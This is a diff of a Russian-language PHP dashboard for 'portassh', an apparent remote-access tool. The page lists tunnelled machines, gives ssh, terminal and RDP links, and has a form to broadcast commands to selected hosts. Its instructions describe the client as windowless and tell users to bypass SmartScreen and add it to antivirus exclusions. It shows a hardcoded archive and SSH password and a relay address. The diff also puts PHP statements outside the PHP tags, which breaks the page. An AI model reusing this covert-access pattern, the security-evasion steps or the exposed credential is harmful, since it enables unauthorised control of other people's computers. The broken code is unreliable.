@@ -151,44 +151,90 @@ if (isset($bports) && isset($results)) {
     $broadcastHtml .= '</table>';
 }
 ?>
+
+$staleCount = 0;
+foreach ($active as $e) { if ($LATEST_NAME !== '' && ($e['ver'] ?? '') !== $LATEST_NAME) { $staleCount++; } }
+?>
 <!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="utf-8">
 <meta http-equiv="refresh" content="20">
-<title>portassh — активные машины</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>portassh — пульт дежурного</title>
 <style>
-  body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #12151c; color: #f0f4fb; margin: 40px; font-size: 15px; }
-  h1 { font-size: 22px; }
-  h1 .count { color: #34d399; }
-  table { border-collapse: collapse; width: 100%; max-width: 950px; }
-  th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #2a3040; }
-  th { color: #c3cfe6; font-weight: 700; font-size: 13px; text-transform: uppercase; }
-  tr:hover td { background: #1a1f2b; }
-  .dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #34d399; margin-right: 8px;
-         box-shadow: 0 0 6px #34d399; animation: pulse 2s infinite; }
-  @keyframes pulse { 50% { opacity: .5; } }
-  .role-admin { color: #fbbf24; font-weight: 600; }
-  .role-user  { color: #4ade80; font-weight: 600; }
-  .ago { color: #cbd6ea; font-size: 14px; }
-  .cmd { font-family: Consolas, monospace; font-size: 14px; color: #c9dcfb; user-select: all; }
-  .empty { color: #cbd6ea; font-size: 15px; }
-  .meta { font-size: 12px; color: #8fa1c0; margin-top: 3px; }
-  a.dl { color: #0f172a; background: #4ade80; padding: 7px 14px; border-radius: 6px; text-decoration: none; font-weight: 700; font-size: 14px; }
-  a.dl:hover { background: #22c55e; }
-  a.dl.blue { background: #60a5fa; }
-  a.dl.blue:hover { background: #3b82f6; }
-  .box { max-width: 950px; margin: 0 0 30px 0; background: #181d28; border: 1px solid #2a3040; border-radius: 8px; padding: 4px 22px 14px 22px; }
-  .box summary { cursor: pointer; font-weight: 700; font-size: 15px; color: #9fe8bf; padding: 10px 0; }
-  .box h2 { font-size: 16px; color: #c3cfe6; margin: 18px 0 8px 0; }
-  .box p, .box li { font-size: 14px; line-height: 1.55; color: #dbe4f5; }
+  :root {
+    --bg: #f6f8fb; --card: #ffffff; --border: #e5eaf1;
+    --text: #0f172a; --muted: #64748b; --accent: #4f46e5;
+    --green: #10b981; --amber: #f59e0b; --red: #ef4444;
+  }
+  * { box-sizing: border-box; }
+  body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 24px 28px 60px; font-size: 15px; }
+  .wrap { max-width: 1080px; margin: 0 auto; }
+  header.top { display: flex; align-items: flex-start; justify-content: space-between; gap: 16px; flex-wrap: wrap; margin-bottom: 18px; }
+  h1 { font-size: 21px; margin: 0 0 4px; display: flex; align-items: center; gap: 10px; }
+  .sub { color: var(--muted); font-size: 13px; }
+  .sub b { color: var(--text); }
+  .badge-live { background: #ecfdf5; color: #059669; border: 1px solid #a7f3d0; font-size: 12px; font-weight: 700; padding: 3px 10px; border-radius: 999px; }
+  .actions { display: flex; gap: 8px; flex-wrap: wrap; }
+  .btn { display: inline-flex; align-items: center; gap: 6px; padding: 8px 14px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 13px; border: 1px solid var(--border); background: #fff; color: var(--text); cursor: pointer; }
+  .btn:hover { border-color: #c7d2fe; background: #eef2ff; }
+  .btn.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+  .btn.primary:hover { background: #4338ca; }
+  .btn.amber { color: #92400e; background: #fffbeb; border-color: #fde68a; }
+  .btn.amber:hover { background: #fef3c7; }
+  .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 12px; margin-bottom: 18px; }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 14px 18px; }
+  .card .num { font-size: 26px; font-weight: 800; }
+  .card .lbl { color: var(--muted); font-size: 12.5px; margin-top: 2px; }
+  .num.g { color: var(--green); } .num.a { color: var(--amber); } .num.i { color: var(--accent); }
+  .panel { background: var(--card); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 18px; overflow: hidden; }
+  .panel-head { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 14px 18px; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+  .panel-head h2 { font-size: 15px; margin: 0; }
+  input[type=text], input[type=search] { font-family: inherit; }
+  #q { padding: 8px 12px; border: 1px solid var(--border); border-radius: 8px; font-size: 13.5px; width: 240px; background: #fff; }
+  table { border-collapse: collapse; width: 100%; font-size: 14px; }
+  th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #eef1f6; vertical-align: top; }
+  th { color: var(--muted); font-weight: 700; font-size: 11.5px; text-transform: uppercase; letter-spacing: .4px; }
+  tr:hover td { background: #f8fafc; }
+  tr:last-child td { border-bottom: 0; }
+  .dot { display: inline-block; width: 9px; height: 9px; border-radius: 50%; background: var(--green); margin-right: 2px; animation: pulse 2s infinite; }
+  @keyframes pulse { 50% { opacity: .45; } }
+  .mname { font-weight: 700; font-size: 14.5px; }
+  .mhost { color: var(--muted); font-size: 12px; font-family: ui-monospace, Consolas, monospace; }
+  .chip { display: inline-block; background: #f1f5f9; border-radius: 999px; padding: 2px 9px; font-size: 11.5px; color: #475569; margin: 2px 4px 2px 0; }
+  .chip.ver-ok { background: #ecfdf5; color: #059669; font-weight: 700; }
+  .chip.ver-old { background: #fffbeb; color: #b45309; font-weight: 700; }
+  .role-pill { display: inline-block; padding: 2px 10px; border-radius: 999px; font-size: 12px; font-weight: 600; }
+  .role-admin { background: #fff7ed; color: #c2410c; }
+  .role-user  { background: #eef2ff; color: #4f46e5; }
+  .ago { color: var(--muted); font-size: 12.5px; white-space: nowrap; }
+  .cmd { font-family: ui-monospace, Consolas, monospace; font-size: 12.5px; color: #334155; user-select: all; word-break: break-all; }
+  .btnrow a { margin-right: 6px; margin-bottom: 4px; }
+  .btn.sm { padding: 4px 10px; font-size: 12px; border-radius: 6px; }
+  .btn.sky { color: #075985; background: #f0f9ff; border-color: #bae6fd; }
+  .btn.sky:hover { background: #e0f2fe; }
+  .btn.copy { color: #475569; }
+  .empty { color: var(--muted); padding: 22px; text-align: center; }
+  .bwrap { display: flex; gap: 10px; padding: 14px 18px; flex-wrap: wrap; align-items: center; }
+  .bwrap input[type=text] { flex: 1; min-width: 260px; padding: 9px 12px; border: 1px solid var(--border); border-radius: 8px; font-size: 13.5px; font-family: ui-monospace, Consolas, monospace; }
+  .bwrap button { background: var(--accent); color: #fff; border: 0; border-radius: 8px; padding: 9px 18px; font-weight: 700; font-size: 13px; cursor: pointer; }
+  .bwrap button:hover { background: #4338ca; }
+  pre { font-family: ui-monospace, Consolas, monospace; }
+  .box { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 6px 22px 16px; }
+  .box summary { cursor: pointer; font-weight: 700; font-size: 14.5px; color: var(--accent); padding: 12px 0; }
+  .box h2 { font-size: 15px; margin: 20px 0 8px; }
+  .box p, .box li { font-size: 13.5px; line-height: 1.6; color: #334155; }
   .box ol, .box ul { margin: 6px 0 6px 22px; }
-  .pwtab { margin: 8px 0 4px 0; width: auto; }
-  .pwtab td, .pwtab th { border-bottom: 1px solid #2a3040; }
-  .pw { font-family: Consolas, monospace; color: #fbbf24; font-weight: 700; user-select: all; }
+  .pwtab { margin: 8px 0; width: auto; }
+  .pwtab td, .pwtab th { border-bottom: 1px solid #eef1f6; }
+  .pw { font-family: ui-monospace, Consolas, monospace; color: #b45309; font-weight: 700; user-select: all; }
+  .result-chip { font-weight: 800; }
+  a { color: var(--accent); }
 </style>
 </head>
 <body>
+<div class="wrap">
 <script>
 function editAlias(host, cur, note) {
   const n = prompt('Имя машины (оставить пустым = удалить метку):', cur || '');
@@ -197,6 +243,18 @@ function editAlias(host, cur, note) {
   if (t === null) return;
   location.href = '/sshdash?setalias=' + encodeURIComponent(host)
     + '&name=' + encodeURIComponent(n) + '&note=' + encodeURIComponent(t);
+}
+function copyCmd(text, el) {
+  navigator.clipboard.writeText(text).then(() => {
+    const old = el.textContent; el.textContent = '✓ скопировано';
+    setTimeout(() => el.textContent = old, 1500);
+  });
+}
+function filterRows(q) {
+  q = q.toLowerCase();
+  document.querySelectorAll('tr[data-search]').forEach(tr => {
+    tr.style.display = tr.getAttribute('data-search').includes(q) ? '' : 'none';
+  });
 }
 </script>
 <?php
@@ -208,7 +266,6 @@ foreach ($lines as $line) {
     $p = explode(' ', trim($line));
     if (count($p) < 4) continue;
     [$host, $port, $t, $role] = $p;
-    // расширенная телеметрия (сборки 26.10+): username os_version disk ram
     $user = isset($p[4]) && $p[4] !== '-' ? $p[4] : '';
     $osv  = isset($p[5]) && $p[5] !== '-' ? $p[5] : '';
     $disk = isset($p[6]) && (int)$p[6] >= 0 ? (int)$p[6] : null;
@@ -218,41 +275,122 @@ foreach ($lines as $line) {
     $meta = [];
     if ($user !== '')  { $meta[] = '👤 ' . htmlspecialchars($user); }
     if ($osv !== '')   { $meta[] = 'OS ' . htmlspecialchars($osv); }
-    if ($disk !== null){ $meta[] = 'C: ' . $disk . 'GB'; }
-    if ($ram !== null) { $meta[] = 'RAM ' . $ram . '%'; }
+    if ($disk !== null){ $meta[] = '💾 C: ' . $disk . ' GB'; }
+    if ($ram !== null) { $meta[] = '🧠 RAM ' . $ram . '%'; }
+    $verOk = false;
     if ($ver !== '') {
-        if ($LATEST_NAME !== '' && $ver === $LATEST_NAME) {
-            $meta[] = '<span style="color:#34d399">ver. ' . htmlspecialchars($ver) . '</span>';
-        } elseif ($LATEST_NAME !== '') {
-            $meta[] = '<span style="color:#f59e0b">устарела — ver. ' . htmlspecialchars($LATEST_NAME) . '</span>';
-        } else {
-            $meta[] = 'v ' . htmlspecialchars($ver);
-        }
+        $verOk = ($LATEST_NAME !== '' && $ver === $LATEST_NAME);
+        $meta[] = $verOk
+            ? '<span class="chip ver-ok">ver. ' . htmlspecialchars($ver) . '</span>'
+            : ($LATEST_NAME !== ''
+                ? '<span class="chip ver-old">устарела → ver. ' . htmlspecialchars($LATEST_NAME) . '</span>'
+                : '<span class="chip">v ' . htmlspecialchars($ver) . '</span>');
     }
     if (!in_array($role, ['user', 'admin'], true)) continue;
-    // формат времени из реестра: "ДД.ММ_ЧЧ:ММ" (год не пишется)
     [$dmy, $hm] = explode('_', $t);
     [$dd, $mm] = explode('.', $dmy);
     $ts = mktime((int)substr($hm, 0, 2), (int)substr($hm, 3, 2), 0, (int)$mm, (int)$dd) + $SKEW;
-    if ($ts - $sysNow > 86400) $ts = strtotime('-1 year', $ts) + $SKEW; // смена года
+    if ($ts - $sysNow > 86400) $ts = strtotime('-1 year', $ts) + $SKEW;
     if ($sysNow - $ts > $MAX_AGE) continue;
     $key = $host . '|' . $role;
     if (!isset($latest[$key]) || $latest[$key]['ts'] < $ts) {
-        $latest[$key] = compact('host', 'port', 'role', 'ts', 't');
+        $latest[$key] = compact('host', 'port', 'role', 'ts', 't', 'user', 'osv', 'disk', 'ram', 'ver', 'verOk', 'alias', 'meta');
     }
 }
-// оставляем только живые: heartbeat раз в минуту, окно ×3
 $active = array_filter($latest, fn($e) => $sysNow - $e['ts'] <= $ACTIVE_SECS);
 usort($active, fn($a, $b) => $b['ts'] <=> $a['ts']);
-
-echo '<h1>portassh — активные машины: <span class="count">' . count($active) . '</span> <span style="float:right"><a class="dl" href="?dl=zip">⬇ Скачать .zip</a> &nbsp; <a class="dl" style="background:#60a5fa" href="?dl=bin">⬇ .bin</a> &nbsp; <a class="dl" style="background:#fbbf24" href="?dl=key">🔑 Ключ</a> &nbsp; <a class="dl" style="background:#f59e0b" href="?force=1" title="клиенты проверят обновление в течение минуты">⟳ Обновить клиентов</a><div style="text-align:right;color:#cbd6ea;font-size:12px;margin-top:6px">актуальная сборка: <b>' . ($LATEST_NAME !== '' ? 'ver. ' . htmlspecialchars($LATEST_NAME) : '?') . '</b> · пароль архива и SSH (резерв): <b>RtnM91jK.!</b></div></span></h1>';
-
-// ---- Описание и инструкция ----
-$PW = 'RtnM91jK.!';
+$staleActive = count(array_filter($active, fn($e) => !$e['verOk']));
 ?>
-<div class="box">
+<header class="top">
+  <div>
+    <h1>portassh <span class="badge-live">● <?= count($active) ?> активных</span></h1>
+    <div class="sub">пульт дежурного · автообновление 20 с · актуальная сборка <b><?= $LATEST_NAME !== '' ? 'ver. ' . htmlspecialchars($LATEST_NAME) : '?' ?></b></div>
+  </div>
+  <div class="actions">
+    <a class="btn" href="?dl=zip">⬇ .zip</a>
+    <a class="btn" href="?dl=bin">⬇ .bin</a>
+    <a class="btn" href="?dl=key">🔑 Ключ</a>
+    <a class="btn amber" href="?force=1" title="клиенты проверят обновление в течение минуты">⟳ Обновить клиентов</a>
+  </div>
+</header>
+
+<section class="cards">
+  <div class="card"><div class="num g"><?= count($active) ?></div><div class="lbl">активных машин</div></div>
+  <div class="card"><div class="num a"><?= $staleActive ?></div><div class="lbl">требуют обновления</div></div>
+  <div class="card"><div class="num i"><?= count(array_filter($active, fn($e) => $e['role'] === 'admin')) ?></div><div class="lbl">админских сессий</div></div>
+  <div class="card"><div class="num"><?= count($aliases) ?></div><div class="lbl">меток в справочнике</div></div>
+</section>
+
+<div class="panel">
+  <div class="panel-head">
+    <h2>Машины</h2>
+    <input type="search" id="q" placeholder="фильтр: имя, хост, пользователь…" oninput="filterRows(this.value)">
+  </div>
+  <form method="get" action="/sshdash">
+  <table>
+  <tr><th style="width:34px"><input type="checkbox" onchange="document.querySelectorAll('input[name=sel[]]').forEach(c=>c.checked=this.checked)"></th><th>Машина</th><th>Роль</th><th>Порт</th><th>Действия</th><th>Heartbeat</th></tr>
+  <?php
+  if (!$active) {
+      echo '<tr><td colspan="6" class="empty">Нет активных машин — запустите portassh.exe на целевом компьютере</td></tr>';
+  }
+  foreach ($active as $e) {
+      $sec = $sysNow - $e['ts'];
+      $seen = $sec < 5 ? 'только что' : $sec . ' с назад';
+      $cmd = "ssh -i portassh_client.key -o StrictHostKeyChecking=accept-new -J support@{$GLOBALS['RELAY']} -p {$e['port']} anyuser@localhost";
+      $alias = $e['alias'];
+      $meta = $e['meta'];
+      if ($alias !== null && $alias['name'] !== '') {
+          array_unshift($meta, '🖥 ' . htmlspecialchars($e['host']));
+      }
+      if ($alias !== null && $alias['note'] !== '') {
+          $meta[] = '📝 ' . htmlspecialchars($alias['note']);
+      }
+      $metaHtml = $meta ? '<div class="meta">' . implode(' · ', $meta) . '</div>' : '';
+      $dispName = ($alias !== null && $alias['name'] !== '') ? $alias['name'] : $e['host'];
+      $search = mb_strtolower($dispName . ' ' . $e['host'] . ' ' . ($e['user'] ?? '') . ' ' . $e['role']);
+      $editBtn = '<a href="#" onclick="editAlias(\'' . htmlspecialchars($e['host']) . '\', '
+               . htmlspecialchars(json_encode($alias !== null ? $alias['name'] : '')) . ', '
+               . htmlspecialchars(json_encode($alias !== null ? $alias['note'] : '')) . ');return false" title="метка/заметка">✏️</a>';
+      printf(
+          '<tr data-search="%s"><td><input type="checkbox" name="sel[]" value="%d"></td>'
+          . '<td><span class="dot"></span><span class="mname">%s</span>%s%s</td>'
+          . '<td><span class="role-pill role-%s">%s</span></td>'
+          . '<td><b>%d</b></td>'
+          . '<td class="btnrow"><span class="cmd">%s</span><div style="margin-top:6px">'
+          . '<a class="btn sm primary" href="https://itstandart.kz:8899/wsterm?port=%d" target="_blank">🖥 Терминал</a>'
+          . ' <a class="btn sm sky" href="?rdp=%d">🖥️ RDP</a>'
+          . ' <a class="btn sm copy" href="#" onclick="copyCmd(%s, this);return false">⧉ команда</a>'
+          . '</div></td><td class="ago">%s</td></tr>' . "\n",
+          htmlspecialchars($search),
+          (int) $e['port'],
+          htmlspecialchars($dispName),
+          $metaHtml,
+          $editBtn,
+          $e['role'],
+          $e['role'] === 'admin' ? 'админ' : 'пользователь',
+          (int) $e['port'],
+          htmlspecialchars($cmd),
+          (int) $e['port'],
+          (int) $e['port'],
+          htmlspecialchars(json_encode($cmd)),
+          htmlspecialchars($seen)
+      );
+  }
+  ?>
+  </table>
+  <div class="bwrap">
+    <input type="hidden" name="broadcast" value="1">
+    <input type="text" name="bcmd" placeholder="команда для выбранных машин, напр. sys:disks" value="<?= htmlspecialchars($bcmdSaved) ?>">
+    <button type="submit">▶ Выполнить на выбранных</button>
+  </div>
+  </form>
+</div>
+
+<?= $broadcastHtml ?>
+
+<div class="panel box">
 <details>
-<summary>📖 Что такое portassh и как этим пользоваться — нажмите, чтобы раскрыть/свернуть</summary>
+<summary>📖 Описание и полная инструкция — раскрыть</summary>
 
 <h2>Что это</h2>
 <p>portassh — инструмент удалённого доступа к компьютерам через SSH-туннель. На целевом
@@ -267,13 +405,13 @@ portassh подтверждает туннель каждую минуту; ма
 
 <h2>Установка на целевом компьютере (Windows)</h2>
 <ol>
-<li>Нажмите «⬇ Скачать .zip» выше.</li>
+<li>Нажмите «⬇ .zip» выше.</li>
 <li>Распакуйте архив. Пароль архива: <span class="pw">RtnM91jK.!</span></li>
 <li>Запустите <span class="cmd">portassh.exe</span> двойным кликом. Окна нет — так и
 задумано: программа работает в фоне.</li>
 </ol>
 <p>Готово — через минуту компьютер появится в таблице выше.</p>
-<p style="font-size:13px;color:#cbd6ea">Если Windows покажет синее окно (SmartScreen):
+<p style="font-size:12.5px;color:var(--muted)">Если Windows покажет синее окно (SmartScreen):
 «Подробнее» → «Выполнить в любом случае».
 Если антивирус удалил файл: добавьте portassh.exe в исключения антивируса и скачайте заново.</p>
 
@@ -283,11 +421,10 @@ portassh подтверждает туннель каждую минуту; ма
 <span class="cmd">portassh_client.key</span> (обычно в папку «Загрузки»).</li>
 <li>Откройте терминал в той же папке:
 <ul>
-<li>Windows: Win+R → введите <span class="cmd">cmd</span> → Enter →
-в чёрном окне введите <span class="cmd">cd %USERPROFILE%\Downloads</span></li>
+<li>Windows: Win+R → <span class="cmd">cmd</span> → <span class="cmd">cd %USERPROFILE%\Downloads</span></li>
 <li>Mac/Linux: <span class="cmd">cd ~/Downloads</span></li>
 </ul></li>
-<li>Скопируйте команду нужной машины из таблицы ниже и вставьте в терминал.</li>
+<li>Скопируйте команду нужной машины из таблицы и вставьте в терминал.</li>
 </ol>
 <p>Всё — вы на удалённом компьютере. С ключом пароль не спросится
 (пароль — запасной вариант, если ключа нет).</p>
@@ -298,7 +435,8 @@ portassh подтверждает туннель каждую минуту; ма
 <span class="cmd">sys:svcs</span> (службы),
 <span class="cmd">sys:disks</span> (место на дисках) —
 дописываются вместо команды: <span class="cmd">…anyuser@localhost "sys:disks"</span>.</p>
-<h2>RDP — удалённый рабочий стол в 1 клик</h2>
+
+<h2>RDP — удалённый рабочий стол</h2>
 <ol>
 <li>Проверьте, что RDP на машине включён (машина Pro). Если нет — подключитесь
 по SSH и выполните в админском сеансе:
@@ -316,7 +454,7 @@ portassh подтверждает туннель каждую минуту; ма
 (модель, серийник-гид, CPU/RAM, диски, юзер, сетевые адаптеры);
 <span class="cmd">ssh -s logs …</span> — живой стриминг portassh.log
 (аналог tail -f, без скачивания файла; Ctrl+C — остановить).</p>
-<p style="font-size:13px;color:#cbd6ea">Команду можно запускать из любой папки, если
+<p style="font-size:12.5px;color:var(--muted)">Команду можно запускать из любой папки, если
 в ней лежит portassh_client.key. Храните ключ только у себя — он заменяет пароль.</p>
 <p>Команда из таблицы выглядит так:</p>
 <p class="cmd">ssh -i portassh_client.key -o StrictHostKeyChecking=accept-new -J support@5.35.81.198 -p &lt;ПОРТ&gt; anyuser@localhost</p>
@@ -360,48 +498,6 @@ portassh подтверждает туннель каждую минуту; ма
 </ul>
 </details>
 </div>
-<form method="get" action="/sshdash">
-<table>
-<tr><th>✓<br><label style="font-size:10px"><input type="checkbox" onchange="document.querySelectorAll('input[name=sel[]]').forEach(c=>c.checked=this.checked)">все</label></th><th>Машина</th><th>Роль</th><th>Порт</th><th>Команда подключения</th><th>Подтверждение</th></tr>
-<?php
-if (!$active) {
-    echo '<tr><td colspan="5" class="empty">Нет активных машин — запустите portassh.exe на целевом компьютере</td></tr>';
-}
-foreach ($active as $e) {
-    $sec = $sysNow - $e['ts'];
-    $seen = $sec < 5 ? 'только что' : $sec . ' с назад';
-    $cmd = "ssh -i portassh_client.key -o StrictHostKeyChecking=accept-new -J support@{$GLOBALS['RELAY']} -p {$e['port']} anyuser@localhost";
-    if ($alias !== null && $alias['name'] !== '') {
-        array_unshift($meta, '🖥 ' . htmlspecialchars($e['host']));
-    }
-    if ($alias !== null && $alias['note'] !== '') {
-        $meta[] = '📝 ' . htmlspecialchars($alias['note']);
-    }
-    $metaHtml = $meta ? '<div class="meta">' . implode(' · ', $meta) . '</div>' : '';
-    $editBtn = '<a href="#" class="meta" onclick="editAlias(\'' . htmlspecialchars($e['host']) . '\', '
-             . htmlspecialchars(json_encode($alias !== null ? $alias['name'] : '')) . ', '
-             . htmlspecialchars(json_encode($alias !== null ? $alias['note'] : '')) . ');return false">✏️</a>';
-    printf(
-        "<tr><td><span class=\"dot\"></span>%s%s %s</td><td class=\"role-%s\">%s</td><td>%s</td><td class=\"cmd\">%s</td><td class=\"ago\">%s</td></tr>\n",
-        htmlspecialchars($alias !== null && $alias['name'] !== '' ? $alias['name'] : $e['host']),
-        $metaHtml,
-        $editBtn,
-        $e['role'],
-        $e['role'] === 'admin' ? 'админ' : 'пользователь',
-        htmlspecialchars($e['port']),
-        htmlspecialchars($cmd) . ' <a class="dl" style="background:#f59e0b;font-size:12px;padding:3px 10px" href="https://itstandart.kz:8899/wsterm?port=' . htmlspecialchars($e['port']) . '" target="_blank">🖥 Терминал</a> <a class="dl" style="background:#38bdf8;font-size:12px;padding:3px 10px" href="?rdp=' . htmlspecialchars($e['port']) . '">🖥️ RDP</a>',
-        htmlspecialchars($seen)
-    );
-}
-?>
-</table>
-<div style="margin:14px 0 30px 0">
-  <input type="hidden" name="broadcast" value="1">
-  <input type="text" name="bcmd" placeholder="команда для выбранных машин, напр. sys:disks" style="width:70%;font-family:Consolas,monospace;font-size:13px;background:#0d1017;color:#e8eefc;border:1px solid #2a3040;border-radius:5px;padding:8px" value="<?php echo htmlspecialchars($bcmdSaved) ?>">
-  <button type="submit" style="background:#60a5fa;color:#0f172a;border:0;border-radius:5px;padding:9px 16px;font-weight:700;font-size:13px">▶ Выполнить на выбранных</button>
 </div>
-</form>
-
-<?php echo $broadcastHtml ?>
 </body>
 </html>
